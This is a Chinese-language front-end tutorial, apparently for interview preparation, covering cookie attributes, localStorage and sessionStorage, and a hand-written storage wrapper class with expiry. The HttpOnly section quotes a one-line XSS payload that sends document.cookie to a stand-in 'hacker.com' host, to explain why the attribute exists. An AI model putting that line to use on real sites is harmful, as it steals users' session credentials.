# 🟢 第一阶段：Cookie 基础与原生操作（上）

## 1. 为什么需要 Cookie？（核心概念）

在 Web 的世界里，浏览器（前端）和服务器（后端）是通过 **HTTP 协议** 对话的。但是，HTTP 协议有一个致命的特点：**它是无状态的（Stateless）**。

*   **场景**：你登录了淘宝，刷新了一下页面。
*   **如果没有 Cookie**：服务器会问：“你是谁？我不认识你。”（因为 HTTP 记不住刚才发生了什么）。你必须每刷新一次就重新输入一次密码。
*   **有了 Cookie**：
    1.  你第一次登录成功，服务器给你发了一张 **“会员卡”**（Cookie）。
    2.  浏览器把这张卡**自动**保存在本地。
    3.  以后你每次给服务器发请求（刷新页面、点击按钮），浏览器都会**自动**带上这张“会员卡”。
    4.  服务器看到卡，就知道：“哦，是张三啊，已登录状态。”

**一句话总结（面试词汇）：**
> Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。

---

## 2. 只有 4KB 的“小纸条”

Cookie 本质上就是一串 **字符串**。它的限制非常多（面试常考）：
*   **容量小**：每个 Cookie 大小不能超过 **4KB**（非常小，存不了大图片）。
*   **数量少**：每个域名下通常限制几十个 Cookie。
*   **格式**：`key=value; key2=value2; ...`

## 4. 动手写代码：最难用的原生 API

现在，切换到 **Console（控制台）** 标签页。我们要用 JavaScript 来操作 Cookie。你会发现原生的 `document.cookie` API 设计得非常“反人类”。

### 任务 A：读取 Cookie
在控制台输入：
```javascript
document.cookie
```
*   **现象**：你会得到一个长长的字符串，类似 `"uid=123; lang=zh; theme=dark"`。
*   **痛点**：它只给了你所有的键值对，用分号隔开。如果你只想拿 `uid` 的值，你还得自己写正则或者字符串切割去截取！

### 任务 B：写入（创建） Cookie
**注意**：`document.cookie` 是一个神奇的属性。当你给它**赋值**时，它**不是覆盖**整个 Cookie，而是**追加/更新**。

请在控制台依次输入以下代码：

```javascript
// 1. 设置一个名为 my_name 的 cookie
document.cookie = "my_name=jack";

// 2. 设置另一个名为 my_age 的 cookie
document.cookie = "my_age=18";

// 3. 再次查看所有 cookie
console.log(document.cookie);
```

**你的操作结果应该是**：字符串里既有 `my_name=jack`，也有 `my_age=18`。

### 任务 C：修改 Cookie
如何修改 `my_name`？直接重新赋值同名的 key 即可。

```javascript
document.cookie = "my_name=rose";
console.log(document.cookie); // my_name 变成了 rose
```

### 任务 D：删除 Cookie（面试坑点）
Cookie 没有 `delete` 方法！
**面试官问：如何删除一个 Cookie？**
**答：** 重新设置这个 Cookie，把它的**过期时间（Expires）设置为过去的一个时间点**。

试着删除 `my_age`：
```javascript
// 设置过期时间为 1970 年（过去的时间）
document.cookie = "my_age=; expires=Thu, 01 Jan 1970 00:00:00 GMT";

// 再次查看，my_age 应该消失了
console.log(document.cookie);
```

# 🟢 第一阶段：HTTP 的“记忆”——Cookie（下：属性与安全）

面试官通常不会让你背 API，而是问：“如何保证 Cookie 的安全？”或者“为什么我的 Cookie 丢了/读不到？”。这都和 Cookie 的属性有关。

在控制台中，Cookie 的属性是通过分号追加设置的，格式如下：
`key=value; Expires=...; Secure; HttpOnly`

## 1. 决定生死：生命周期 (Expires 与 Max-Age)

默认情况下，Cookie 是 **“会话级（Session Cookie）”** 的。
*   **现象**：你不设置过期时间，关闭浏览器（不是关闭标签页，是完全退出浏览器），Cookie 就消失了。
*   **持久化**：如果你想让 Cookie 一直存在，必须设置属性。

### 属性对比：
*   **`Expires`**：使用的是绝对时间（GMT格式日期），比如 `Thu, 01 Jan 2026...`。缺点是受客户端系统时间影响，如果你把电脑时间调回 2000 年，Cookie 可能就失效了。
*   **`Max-Age`**（推荐）：使用的是**相对时间（秒）**。比如 `Max-Age=60` 代表 60秒后自动自杀。优先级比 Expires 高。

### ⌨️ 动手操作：设置一个“短命”的 Cookie
请在控制台输入：
```javascript
// 设置一个 10 秒后过期的 cookie
document.cookie = "bomb=tick-tock; Max-Age=10";

console.log("刚设置:", document.cookie); // 能看到 bomb

// 等待 10 秒后... 再次输入
setTimeout(() => {
    console.log("10秒后:", document.cookie); // bomb 应该消失了
}, 11000);
```

## 2. 只有服务器能碰：HttpOnly (最重要的安全属性)

这是面试**最高频**考点之一。

*   **问题**：如果你的网站被黑客注入了恶意脚本（XSS 攻击），黑客写了一行 `new Image().src = 'http://hacker.com?cookie=' + document.cookie`，你的用户登录凭证（Session ID）就被发给黑客了。
*   **解决**：**HttpOnly**。
*   **定义**：如果一个 Cookie 被标记为 `HttpOnly`，**JavaScript 就无法读取它了**。`document.cookie` 拿不到，但浏览器发 HTTP 请求时**依然会自动带上**。

### 🧪 实验（这是一个反向实验）
**注意**：你**无法**在浏览器控制台通过 JS 设置 `HttpOnly` 属性。

*   **为什么？** 因为如果 JS 能设置，那黑客也能改，就没意义了。这个属性**只能由服务器**在 HTTP 响应头（Set-Cookie）里设置。
*   **面试题**：“我在 Chrome DevTools 的 Application 里看到了一个 Cookie，为什么我在 Console 里打印 `document.cookie` 却找不到它？”
*   **答案**：因为那个 Cookie 设置了 `HttpOnly`。

---

## 3. 跨站与发送限制：SameSite (现代安全标准)

这是为了防止 **CSRF（跨站请求伪造）** 攻击。
*   **场景**：你登录了银行网站 A。你误点了钓鱼网站 B。网站 B 偷偷发了个请求给银行 A 转账。如果没有防护，浏览器会带着 A 的 Cookie 发送请求，银行以为是你本人操作。
*   **解决**：`SameSite` 属性控制跨站请求是否带 Cookie。

### 三个值：
1.  **`Strict`** (严格)：完全禁止第三方请求带 Cookie。比如你在 B 网站点 A 网站的链接，跳过去的时候都不会带 Cookie（导致你需要重新登录），体验较差。
2.  **`Lax`** (宽松 - **现在的默认值**)：允许导航到目标网址的 GET 请求带 Cookie（比如点链接跳转），但图片加载、POST 表单提交等“偷偷”发起的跨站请求不带。
3.  **`None`** (无限制)：任何请求都带。**注意**：如果你设置 `SameSite=None`，必须同时设置 **`Secure`**（即只能在 HTTPS 下使用）。

## 4. 安全三剑客之 `Secure`

*   **定义**：如果一个 Cookie 被标记为 `Secure`，那么浏览器**只会在 HTTPS 协议下**发送这个 Cookie。如果是 HTTP（不加密），浏览器会把这个 Cookie 烂在肚子里，绝不发送。
*   **作用**：防止**中间人攻击（MITM）**。比如你在星巴克连了公共 WiFi，黑客在监听网络。如果你用 HTTP 发送 Cookie，黑客能直接截获明文 Cookie；用了 `Secure` + HTTPS，黑客抓包看到的只是一堆加密乱码。
*   **关联点**：如果你设置了 `SameSite=None`（允许跨站），现代浏览器强制要求你**必须**同时设置 `Secure`。

---

## 5. 作用域：Domain 与 Path

*   **`Domain`**：默认是当前域名。
    *   **面试题**：`a.baidu.com` 能读到 `baidu.com` 的 Cookie 吗？
    *   **答案**：如果在 `baidu.com` 设置 Cookie 时指定了 `Domain=.baidu.com`（注意前面的点），那么子域名 `a.baidu.com` 和 `b.baidu.com` 都可以共享这个 Cookie。如果不指定，子域名读不到。
*   **`Path`**：默认是 `/`。如果设置为 `/admin`，那么只有 `xxxx.com/admin` 下的页面能读到。

1.  **场景题**：我在做登录功能，后端给我返回了 Token。我应该把它存在 `localStorage` 里，还是存在 `Cookie` 里？（提示：从安全角度分析 XSS 和 CSRF）。
2.  **查错题**：前端发请求给后端，后端说“你没登录（没带 Cookie）”，但我看浏览器 Application 里明明有 Cookie，而且也没过期。可能是什么原因？（列举 2 个可能）。

#### 题 1：Token 存 LocalStorage 还是 Cookie？
*   **LocalStorage**：
    *   **缺点**：极易受 **XSS** 攻击。只要黑客能运行 JS，`localStorage.getItem` 就能把 Token 偷走。
    *   **优点**：**天生免疫 CSRF**。因为浏览器不会自动把 LocalStorage 发给后端，必须由你的 JS 代码手动加到 Header 里。黑客无法伪造你的 JS 代码逻辑。

> “推荐存在 **Cookie** 中，并设置 **HttpOnly** 和 **Secure** 属性。
> 这样可以防止 XSS 攻击窃取 Token。虽然 Cookie 存在 CSRF 风险，但我们可以通过设置 **SameSite=Lax/Strict** 属性来有效防御。
> 如果项目必须存 LocalStorage，那必须在代码层面做非常严格的 XSS 过滤。”

#### 题 2：为什么 Application 有 Cookie，但发请求没带？
你的回答已经很棒了，补充一个**关键技术术语**：
1.  **AJAX/Fetch 默认不带 Cookie**：这是最常见原因。在跨域请求中，前端必须手动设置 `withCredentials: true` (XHR) 或 `credentials: 'include'` (Fetch)，否则浏览器即使有 Cookie 也不会带。
2.  **SameSite 限制**：如你所说，如果是跨站请求且 Cookie 是 Lax/Strict，会被拦截。
3.  **Domain/Path 不匹配**：如你所说，父子域名或路径限制。

# 🔵 第二阶段：现代存储标准——Web Storage (LocalStorage & SessionStorage)

这也就是我们常说的“本地存储”。它出现的原因就是为了解决 Cookie 的痛点：**太小（4KB）** 且 **每次都自动发给服务器（浪费流量）**。

## 1. 核心区别（面试必背表格）

| 特性             | Cookie                               | LocalStorage              | SessionStorage                    |
| :--------------- | :----------------------------------- | :------------------------ | :-------------------------------- |
| **容量**         | 4KB                                  | **5MB** (大得多)          | 5MB                               |
| **生命周期**     | 由 Expires 和Max-Age决定 Max-Age优先 | **永久有效** (除非手动删) | **会话级** (关闭**标签页**即失效) |
| **与服务器通信** | 自动发送                             | **不参与** (纯前端存储)   | 不参与                            |
| **作用域**       | 域名                                 | 同源共享                  | **仅当前标签页** (最特殊的点)     |

---

## 2. 实操演示：API 的增删改查

请在浏览器的 **Console** 中跟我一起敲代码（以 `localStorage` 为例，`sessionStorage` 用法完全一样，只是名字不同）。

### 🟢 基础操作
```javascript
// 1. 增 (Create/Update)
localStorage.setItem('user_name', 'Batman');
localStorage.setItem('level', 99);

// 2. 查 (Read)
console.log(localStorage.getItem('user_name')); // "Batman"

// 3. 删 (Delete)
localStorage.removeItem('level');

// 4. 清空所有 (Clear)
// localStorage.clear(); // 先别执行，留着数据做实验
```

### ⚠️ 陷阱一：类型丢失（重点）
请执行以下代码，观察结果：
```javascript
localStorage.setItem('age', 18);       // 存数字
localStorage.setItem('isLogin', true); // 存布尔值

let age = localStorage.getItem('age');
let isLogin = localStorage.getItem('isLogin');

console.log(typeof age);     // 猜猜是 'number' 还是 'string'?
console.log(typeof isLogin); // 猜猜是 'boolean' 还是 'string'?
```

**结论**：Web Storage **只能存字符串**！
*   存进去的 `18` 变成了 `"18"`。
*   存进去的 `true` 变成了 `"true"`。
*   **面试题**：如果我们直接拿取出来的值做计算 `if (isLogin)`，字符串 `"false"` 也会被当成真值，导致严重的逻辑 Bug。

### ⚠️ 陷阱二：对象的灾难
如果你直接存一个对象，会发生什么？
```javascript
const user = { id: 1, name: 'Mike' };
localStorage.setItem('myUser', user);

console.log(localStorage.getItem('myUser')); 
// 输出: "[object Object]"  <-- 数据废了！
```
因为 JS 默认调用了对象的 `toString()` 方法。

**正确做法（JSON 序列化）**：
```javascript
// 存：转为 JSON 字符串
localStorage.setItem('myUser', JSON.stringify(user));

// 取：解析回对象
const savedUser = JSON.parse(localStorage.getItem('myUser'));
console.log(savedUser.name); // "Mike"
```

## 3. SessionStorage 的特殊性（容易搞错）

**SessionStorage** 里的“Session（会话）”和 Cookie 里的 Session 不太一样。
* **Cookie Session**：通常指浏览器窗口不关闭就一直存在。
* #### Q2：什么是 Cookie Session？它和 Tab 的关系？

  这里必须纠正一个概念，Cookie 的作用域**绝不是 Tab**

  - **Cookie Session (会话期 Cookie)**：
    - **定义**：当你创建 Cookie 时，**没有设置** Expires 也没有设置 Max-Age，这个 Cookie 就是一个“会话期 Cookie”。
    - **存活时间**：它存在于**浏览器的内存**中，而不是硬盘里。
    - **什么时候死？** 当你**完全关闭浏览器程序**（Close Browser）时，它会被销毁。
    - **注意**：仅仅关闭一个标签页（Tab），会话期 Cookie **不会死**！只要浏览器还有一个窗口开着，或者你只是刷新页面，它都在。
  - **对比总结**：
    - **SessionStorage**：死于 **标签页 (Tab)** 关闭。
    - **Session Cookie**：死于 **浏览器 (Browser)** 关闭。
    - **普通 Cookie (设置了过期时间)**：死于 **时间到了**（即使关了浏览器，下次打开还在）。
  - **关于作用域**：Cookie 的作用域是 **Domain（域名）**。只要域名对（比如 baidu.com），你在 Chrome 里开 100 个标签页，这 100 个标签页都能共享同一个 Cookie。
*   **SessionStorage**：**仅限当前标签页**。

**测试**：

1.  在当前标签页执行 `sessionStorage.setItem('test', '123')`。
2.  **右键点击**当前标签页 -> “复制标签页” (Duplicate)。
3.  在新的标签页里输入 `sessionStorage.getItem('test')`。
    *   **结果**：能取到！(复制的标签页会拷贝 SessionStorage)。
4.  新建一个**空白标签页**，输入网址打开同一个网页。
    *   **结果**：取不到！(即使是同源，不同标签页也是隔离的)。

# 🟡 第三阶段：实战封装 (Hand-writing Storage)

这是面试中含金量非常高的一环。面试官通过这段代码，能看出你是否具备**模块化思维**、**异常处理能力**以及**解决实际问题的逻辑**。

请打开浏览器控制台（Console），我们将分步构建这个工具类。

我们要封装一个名为 `MyStorage` 的工具类，解决原生 API 的三个痛点：
1.  **类型转换**：自动处理 `JSON.stringify` 和 `JSON.parse`。
2.  **容错处理**：防止非法的 JSON 字符串导致页面崩溃。
3.  **过期机制**：实现你之前设想的“惰性删除”策略。

### 1. 核心代码编写

请将以下代码完整复制并粘贴到你的控制台中，按回车运行。我已经加了详细的注释帮助你理解。

```javascript
class StorageHandler {
    constructor(strategy = 'localStorage') {
        // 允许用户选择是用 localStorage 还是 sessionStorage，默认 local
        this.storage = window[strategy];
    }

    /**
     * 存数据
     * @param {string} key 键名
     * @param {any} value 值 (可以是对象、数组、字符串等)
     * @param {number} expire 过期时间(毫秒)，可选。不传则永久有效
     */
    set(key, value, expire) {
        // 1. 包装数据：把值和过期时间打包成一个对象
        const data = {
            value: value, // 真正的数据
            time: Date.now(), // 存入的时间戳
            expire: expire // 过期时长 (如: 5000毫秒)
        };

        // 2. 序列化：对象转字符串
        // (面试点：这里虽然很少报错，但也建议加上 try-catch 防止循环引用报错)
        try {
            const dataString = JSON.stringify(data);
            this.storage.setItem(key, dataString);
        } catch (e) {
            console.error('存储失败，可能是内存满了或数据格式错误:', e);
        }
    }

    /**
     * 取数据
     * @param {string} key 键名
     * @returns {any | null} 返回值或 null
     */
    get(key) {
        // 1. 获取原始字符串
        const dataString = this.storage.getItem(key);
        
        // 如果根本没存过，直接返回 null
        if (!dataString) return null;

        // 2. 反序列化与异常处理 (核心面试点)
        try {
            const data = JSON.parse(dataString);

            // 3. 检查是否过期 (惰性删除策略)
            if (data.expire) {
                const now = Date.now();
                // 如果 (当前时间 - 存入时间) > 过期时长
                if (now - data.time > data.expire) {
                    console.log(`[${key}] 已过期，自动删除`);
                    this.remove(key); // 销毁数据
                    return null; // 告诉外界没拿到
                }
            }

            // 没过期，返回真正的值
            return data.value;

        } catch (e) {
            // 4. 捕获 JSON.parse 的错误
            // 如果 storage 里存了非 JSON 格式的脏数据，为了防止报错崩溃，我们返回 null
            console.warn('数据格式异常，无法解析:', e);
            return null;
        }
    }

    /**
     * 删除数据
     */
    remove(key) {
        this.storage.removeItem(key);
    }

    /**
     * 清空所有
     */
    clear() {
        this.storage.clear();
    }
}

// 实例化一个全局对象供我们测试
const myDB = new StorageHandler('localStorage');
console.log("封装完成！myDB 对象已创建");
```
